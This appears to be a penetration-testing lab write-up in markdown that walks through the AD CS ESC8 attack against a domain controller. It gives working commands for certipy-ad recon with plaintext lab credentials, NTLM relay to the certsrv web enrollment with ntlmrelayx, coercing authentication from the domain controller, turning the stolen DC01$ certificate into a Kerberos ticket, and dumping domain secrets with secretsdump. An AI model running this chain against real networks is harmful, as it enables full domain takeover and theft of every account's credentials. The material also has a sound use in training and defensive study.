----------------

### AD_CS ESC8

----------------

- ESC8 (exposed certsrv)-:
- Recon with `certipy-ad` -:

```bash
certipy-ad find -u "jtrueblood" -p "blood_brothers" -dc-ip "10.1.57.249" -vulnerable -enabled
```

<img width="1113" height="540" alt="image" src="https://github.com/user-attachments/assets/1cfff4e5-503f-4a2f-9b10-dbe41b7f9b57" />

- Grepping for the vulnerable ADCS's ESC which is ESC8 (web enrollment version exposed via http)-:

```bash
cat *.txt | grep "ESC"

```
<img width="829" height="108" alt="image" src="https://github.com/user-attachments/assets/c660c81f-927a-404a-80cb-24c66170b969" />

- ESC8 is a vulnerability related to ADCS Web Enrollment. ADCS Web Enrollment is a feature that deploys a web server, enabling clients to request a certificate template. This web server supports NTLM authentication, making it susceptible to relay attacks. For this attack to succeed, you must know a valid template name to enroll in. Fortunately, ADCS comes with several default enabled templates that can be used, including ‘User,’ ‘Machine,’ and ‘DomainController.’ These templates are fairly self-explanatory: ‘User’ is for Domain Users, ‘Machine’ is for Domain Computers, and ‘DomainController’ is for Enterprise Domain Controllers.
- Exploiting with `impacket-ntlmrelayx`-:

```bash
impacket-ntlmrelayx -t http://10.1.57.249/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

<img width="1318" height="696" alt="image" src="https://github.com/user-attachments/assets/3a9d7f78-a46c-4219-90cd-6794e0843feb" />

- Later, you have to use the printer bug to coerce authentication

```bash
nxc smb 10.1.57.249 -M coerce_plus -o LISTENER="10.200.88.20"
```

<img width="1561" height="142" alt="image" src="https://github.com/user-attachments/assets/86960c6f-4da7-4d3a-9151-aeca6cf866b3" />

- Certificate for machine `DC01$` received

<img width="1057" height="361" alt="image" src="https://github.com/user-attachments/assets/93cd80a1-813b-44ec-9329-d52be7ae4549" />

- Convert to ticket grant ticket with `pkinttools`-:

```bash
python3 gettgtpkinit.py -cert-pfx DC01.shadow.gate.pfx -dc-ip 10.1.57.249 shadow.gate/dc01$ admin.ccache
```
<img width="1124" height="193" alt="image" src="https://github.com/user-attachments/assets/c3f8b78f-3592-4c11-b639-7b4882f69390" />

- Dump secrets with `impacket-secrets-dump`

```bash
impacket-secretsdump -k -no-pass dc01.shadow.gate
```

<img width="1031" height="523" alt="image" src="https://github.com/user-attachments/assets/fc622cf9-79cd-48bf-827e-94e2c0ced536" />



